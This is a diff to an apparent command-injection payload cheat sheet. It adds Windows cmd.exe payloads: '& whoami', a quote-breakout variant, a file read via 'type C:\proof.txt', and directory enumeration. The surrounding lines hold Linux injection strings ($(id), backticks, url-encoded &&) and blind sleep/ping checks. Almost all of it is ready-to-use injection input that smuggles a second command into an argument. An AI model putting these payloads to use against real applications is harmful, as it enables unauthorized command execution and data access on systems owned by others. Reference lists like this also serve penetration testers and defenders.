@@ -11,6 +11,13 @@ $(id)
 `id`
 %26%26id           # url-encoded &&
 
+## Windows separators (cmd.exe) — the app may wrap your input in quotes, so close them first
+& whoami                         # e.g.  C:\backup& whoami
+"& whoami                        # break out of a quoted arg:  C:\backup"& whoami
+"& type C:\proof.txt             # read a file (dir C:\ to locate it first)
+| whoami
+& dir C:\                        # enumerate
+
 ## Blind confirm
 ; sleep 5                       # Linux
 & ping -n 6 127.0.0.1           # Windows
